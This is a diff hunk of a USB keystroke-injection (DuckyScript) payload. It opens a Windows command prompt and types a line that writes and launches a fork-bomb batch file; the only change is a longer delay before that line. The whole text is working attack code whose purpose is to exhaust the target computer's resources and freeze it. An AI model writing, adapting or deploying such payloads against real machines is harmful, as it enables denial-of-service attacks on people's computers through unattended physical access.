@@ -7,6 +7,6 @@ GUI r
 DELAY 1000
 STRING cmd
 ENTER
-DELAY 750
+DELAY 1000
 STRING echo %0^|%0 > forkbomb.bat && forkbomb.bat
 ENTER
